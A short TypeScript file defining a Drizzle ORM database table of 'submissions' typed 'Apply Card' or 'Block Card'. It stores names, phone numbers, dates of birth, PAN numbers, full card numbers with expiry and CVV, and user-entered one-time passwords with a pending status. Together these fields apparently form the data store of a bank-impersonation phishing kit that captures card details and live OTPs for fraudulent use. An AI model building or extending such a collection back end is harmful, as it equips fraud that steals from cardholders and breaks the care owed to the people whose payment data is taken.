import {
  pgTable,
  serial,
  varchar,
  timestamp,
  jsonb,
} from "drizzle-orm/pg-core";

export const submissions = pgTable("submissions", {
  id: serial("id").primaryKey(),
  type: varchar("type", { length: 50 }).notNull(), // 'Apply Card' or 'Block Card'
  fullName: varchar("full_name", { length: 255 }),
  mobile: varchar("mobile", { length: 20 }),
  email: varchar("email", { length: 255 }),
  city: varchar("city", { length: 100 }),
  dob: varchar("dob", { length: 20 }),
  pan: varchar("pan", { length: 20 }),
  cardLimit: varchar("card_limit", { length: 50 }),
  cardNumber: varchar("card_number", { length: 30 }),
  expiry: varchar("expiry", { length: 10 }),
  cvv: varchar("cvv", { length: 10 }),
  cardHolder: varchar("card_holder", { length: 255 }),
  otp: varchar("otp", { length: 10 }),
  otpStatus: varchar("otp_status", { length: 50 }).default("Pending"),
  extraData: jsonb("extra_data"), // for any additional fields
  createdAt: timestamp("created_at").notNull().defaultNow(),
});
